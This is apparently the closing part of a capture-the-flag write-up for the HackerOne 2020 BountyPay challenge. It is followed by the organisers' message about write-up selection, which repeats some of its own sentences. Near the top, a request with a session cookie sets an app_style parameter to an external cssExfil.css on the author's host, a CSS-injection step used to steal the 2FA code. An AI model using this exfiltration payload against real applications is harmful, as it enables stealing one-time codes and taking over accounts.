Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9

app_style=https%3A%2F%2Fbatee5apentest.000webhostapp.com/cssExfil.css

I got the response to my Burp Collaborator with the 2FA Code, quickly assembling and submitting it finally resulted in the screen that made me so happy!

I finally helped @martenmickos pay May bounties to all hackers, I learnt a lot and had so much fun, Thank you for the great CTF!

@batee5a a

activities.message:
Hello,

I wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!

We will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we'll make sure to let you know when you can publish them on your site!

If you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!

We received tons of great submission and it definitely made our decision a lot harder than we excepted. If you were one of the first 10 people to submit a write-up, look out for some private invite in the next few days!
